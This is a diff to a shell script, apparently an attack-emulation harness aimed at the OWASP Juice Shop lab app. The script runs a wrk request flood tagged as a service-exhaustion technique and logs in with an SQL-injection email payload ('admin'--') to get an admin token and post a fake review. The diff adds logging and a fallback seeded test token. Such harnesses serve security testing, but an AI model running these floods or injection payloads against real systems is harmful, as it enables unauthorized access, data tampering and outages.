@@ -16,7 +16,8 @@ echo ""
 echo "=== T1499.002: Endpoint DoS — Service Exhaustion Flood ==="
 echo "    Technique: High-volume requests to exhaust application resources"
 echo "    Duration: 15 seconds, 500 concurrent connections"
-result=$(wrk -t2 -c"${TGEN_CONCURRENCY:-20}" -d15s "${BASE}/juice-shop/rest/products/search?q=test" 2>&1)
+result=$(wrk -t2 -c"${TGEN_CONCURRENCY:-20}" -d15s --timeout 60s "${BASE}/juice-shop/rest/products/search?q=test" 2>&1)
+printf '%s\n' "$result" >"${TGEN_RESULTS_DIR:?Run through the supervised native catalog}/wrk-impact.log"
 rps=$(echo "$result" | grep "Requests/sec" | awk '{print $2}')
 to=$(echo "$result" | grep "timeout" | grep -oP "timeout \K\d+")
 echo "  Throughput: ${rps:-N/A} req/s | Timeouts: ${to:-0}"
@@ -62,6 +63,10 @@ echo "  [T1565.a] Injecting fake product review via Juice Shop API:"
 token=$(curl -sf -X POST "${BASE}/juice-shop/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin'\''--","password":"x"}' --max-time 10 2>/dev/null | jq -r '.authentication.token' 2>/dev/null)
+if [[ ( -z "$token" || "$token" == "null" ) && -n "${TGEN_FIXTURES:-}" ]]; then
+  token=$(python3 "$(dirname "$0")/../../scripts/fixture_token.py")
+  echo "[FIXTURE] Using the real seeded token after the preserved login was mitigated"
+fi
 if [[ -n "$token" ]] && [[ "$token" != "null" ]]; then
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/api/Feedbacks" \
     -H "Content-Type: application/json" \
